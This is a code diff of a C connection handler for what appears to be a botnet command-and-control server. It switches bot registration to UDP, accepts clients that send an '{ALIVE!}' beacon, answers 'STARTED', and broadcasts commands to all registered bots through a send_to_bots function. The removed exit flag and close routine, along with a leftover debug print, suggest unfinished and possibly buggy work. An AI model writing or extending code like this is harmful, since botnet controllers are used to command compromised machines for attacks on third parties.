@@ -1,7 +1,7 @@
 #include "conn_handler.h"
 
 extern CONNS cons;
-extern char STOPFLAG;
+extern int main_sock;
 
 int make_socket(void)
 {
@@ -13,24 +13,21 @@ int make_socket(void)
 	return s;
 }
 
-void *accept_handler(void *arg)
+void *accept_handler(void)
 {
-	int *p_main_sock = (int *) arg;
-	int main_sock = *p_main_sock;
 	struct connections *connects = &cons;
-	int client_sock;
+	char temp[10];
 	while(1){
 		int addrlen = sizeof(struct sockaddr);
-		if((client_sock = accept(main_sock, (struct sockaddr *)&connects->client_conn, &addrlen)) != ERROR){
-			connects->sock = client_sock;
-			fprintf(stdout, "[+] New Connection from : %s\n", inet_ntoa(connects->client_conn.sin_addr));
-			sendto(client_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
+		if(recvfrom(main_sock, temp, 10, 0, (struct sockaddr *)&connects->client_conn, &addrlen) != ERROR){
+			if(strncmp(temp, "{ALIVE!}", 8) != 0)
+				continue;
+
+			sendto(main_sock, "STARTED", 7, 0, (struct sockaddr *)&connects->client_conn , sizeof(struct sockaddr));
+			connects->sock = make_socket();
 			connects = connects->next;
 		}
-		// we need a Exit Call Protocol
-		if(STOPFLAG){
-			break;
-		}
+
 	}
 	pthread_exit(0);
 }
@@ -38,8 +35,9 @@ void *accept_handler(void *arg)
 void send_to_bots(char *data)
 {
 	struct connections *connects = &cons;
-	while(connects->next != NULL){
-		int ret = sendto(connects->sock, data, strlen(data), 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr));
+	while(connects != NULL){
+		int ret = sendto(connects->sock, data, strlen(data)+1, 0, (struct sockaddr *)&connects->client_conn, sizeof(struct sockaddr));
+		// DEBUG
 		printf("%d\n", ret);
 		connects = connects->next;
 	}
@@ -55,9 +53,4 @@ void bind_socket(int sock, short port, struct sockaddr_in *serverAddr)
 		perror("Failed to bind the Socket");
 		exit(1);
 	}
-}
-
-void close_socket(int sock_)
-{
-	close(sock_);
 }
